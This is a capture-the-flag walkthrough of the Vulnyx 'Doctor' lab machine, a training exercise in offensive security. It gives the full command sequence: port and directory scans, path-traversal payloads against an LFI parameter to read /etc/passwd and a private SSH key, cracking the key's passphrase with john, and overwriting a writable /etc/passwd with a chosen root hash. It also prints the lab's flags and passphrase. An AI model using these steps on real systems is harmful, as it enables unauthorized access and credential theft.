# Vulnyx: Doctor

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Low |
| **Creator** | `m0w` |
| **Tools used** | `nmap` · `gobuster` · `ffuf` · `ssh2john` · `john` · `openssl` |
| **Tags** | `#LFI` `#SSHKeyLeak` `#HashCracking` `#WritablePasswd` |
| **URL** | https://vulnyx.com/machines/ |

A Local File Inclusion vulnerability in `doctor-item.php` is used to read `admin`'s private SSH key straight off disk. The key is passphrase-protected, but the passphrase cracks with `rockyou.txt`. From there, `/etc/passwd` itself turns out to be writable, which is enough to plant a known password hash for `root` and switch users directly.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn doctor.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:E1:32:2E (VMware)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV doctor.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Docmed
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:E1:32:2E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

The main page:

```
http://doctor.nyx
```
<img src="../Images/doctor/Pasted image 20260518171830.png"/>

A directory scan is run to look for pages not linked from the front page:

```bash
$ gobuster dir -u 'http://doctor.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 39760]
contact.html         (Status: 200) [Size: 49539]
about.html           (Status: 200) [Size: 31341]
img                  (Status: 301) [Size: 312] [--> http://doctor.nyx/img/]
blog.html            (Status: 200) [Size: 31455]
main.html            (Status: 200) [Size: 931]
css                  (Status: 301) [Size: 312] [--> http://doctor.nyx/css/]
js                   (Status: 301) [Size: 311] [--> http://doctor.nyx/js/]
elements.html        (Status: 200) [Size: 39421]
fonts                (Status: 301) [Size: 314] [--> http://doctor.nyx/fonts/]
Department.html      (Status: 200) [Size: 35900]
server-status         (Status: 403) [Size: 278]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

## Initial Access

### Local File Inclusion

`doctor-item.php` takes an `include` parameter that loads content dynamically:

```
http://doctor.nyx/doctor-item.php?include=Doctors.html
```
<img src="../Images/doctor/Pasted image 20260518171912.png"/>

`ffuf` fuzzes for payloads that break out of the expected file, filtering on word count to cut out identical "not found"-style responses:

```bash
$ ffuf -u 'http://doctor.nyx/doctor-item.php?include=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 1

..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 5ms]
..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 62ms]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 65ms]
/etc/fstab                       [Status: 200, Size: 664, Words: 162, Lines: 13, Duration: 4ms]
/etc/crontab                     [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 11ms]
/etc/apt/sources.list            [Status: 200, Size: 881, Words: 89, Lines: 22, Duration: 21ms]
/etc/hosts                       [Status: 200, Size: 186, Words: 19, Lines: 8, Duration: 4ms]
/etc/hosts.allow                 [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 9ms]
/etc/hosts.deny                  [Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 12ms]
../../../../../../../../etc/hosts [Status: 200, Size: 186, Words: 19, Lines: 8, Duration: 16ms]
/etc/init.d/apache2              [Status: 200, Size: 8181, Words: 1500, Lines: 356, Duration: 8ms]
/etc/issue                       [Status: 200, Size: 23, Words: 13, Lines: 3, Duration: 15ms]
/etc/nsswitch.conf               [Status: 200, Size: 494, Words: 129, Lines: 21, Duration: 1ms]
././././../../../../etc/passwd   [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 3ms]
../../../../../../../etc/passwd  [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 15ms]
/etc/passwd                      [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 16ms]
../../../../../../etc/passwd     [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 15ms]
```

Confirmed directly:

```
view-source:http://doctor.nyx/doctor-item.php?include=/etc/passwd
```
<img src="../Images/doctor/Pasted image 20260518172000.png"/>

### Reading admin's SSH Key

With arbitrary file read confirmed, the same parameter is pointed at a private key:

```
view-source:http://doctor.nyx/doctor-item.php?include=/home/admin/.ssh/id_rsa
```
<img src="../Images/doctor/Pasted image 20260518172016.png"/>

A first connection attempt with the recovered key confirms it's passphrase-protected before going any further:

```bash
$ chmod 600 admin_rsa
```
```bash
$ ssh -i admin_rsa admin@doctor.nyx
The authenticity of host 'doctor.nyx (doctor.nyx)' can't be established.
ED25519 key fingerprint is: SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'doctor.nyx' (ED25519) to the list of known hosts.
Enter passphrase for key 'admin_rsa':
```

### Cracking the Passphrase

The key is passphrase-protected. Its hash is extracted and cracked:

```bash
$ ssh2john admin_rsa > admin_rsa.hash
```
```bash
$ john admin_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (admin_rsa)
1g 0:00:00:00 DONE (2026-05-18 16:35) 25.00g/s 31200p/s 31200c/s 31200C/s ramona..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Passphrase:** `unicorn`

### Shell as admin

```bash
$ ssh -i admin_rsa admin@doctor.nyx
Enter passphrase for key 'admin_rsa':
admin@doctor:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@doctor:~$ ls -l /home/admin/
total 4
-r-------- 1 admin admin 33 Apr 21  2023 user.txt
admin@doctor:~$ cat /home/admin/user.txt
0819e6dfb35db7c61353e4dce311b397
```

> **User flag:** `0819e6dfb35db7c61353e4dce311b397`

## Privilege Escalation

### Writable `/etc/passwd`

A search for writable files not owned by the current user turns up something significant:

```bash
admin@doctor:~$ find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
-rw-rw-r-- 1 root root 1404 May 18 16:47 /etc/passwd
```

`/etc/passwd` itself is writable. On most modern systems the password field there is just a placeholder (`x`), with the real hash living in `/etc/shadow` instead — but if `/etc/passwd` can be edited directly, a password hash placed in that second field is honored on its own, without touching `/etc/shadow` at all. `openssl passwd` generates a hash in the right format for a chosen password:

```bash
admin@doctor:~$ openssl passwd root
E4m.vvfkKBbRo
admin@doctor:~$ ls -l /etc/passwd
-rw-rw-rw- 1 root root 1392 Dec 30  2024 /etc/passwd
admin@doctor:~$ nano /etc/passwd
admin@doctor:~$ cat /etc/passwd
root:E4m.vvfkKBbRo:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
```

```bash
admin@doctor:~$ su root
Password:
root@doctor:/home/admin# id
uid=0(root) gid=0(root) groups=0(root)
root@doctor:/home/admin# ls -l /root
total 4
-r-------- 1 root root 33 Apr 21  2023 root.txt
root@doctor:/home/admin# cat /root/root.txt
dfde8cc67ed8819b2386dc74e472ecc6
```

> **Root flag:** `dfde8cc67ed8819b2386dc74e472ecc6`

## Takeaways

- An LFI isn't limited to web-related files — anything the web server process can read is fair game, private SSH keys included.
- A passphrase-protected key isn't a dead end on its own; if the passphrase is weak enough to be in a wordlist like `rockyou.txt`, cracking it is often faster than finding another way in.
- `/etc/passwd` being writable is a full root compromise on its own — the password field there doesn't need `/etc/shadow`'s cooperation, it's honored directly by anything that authenticates against the file.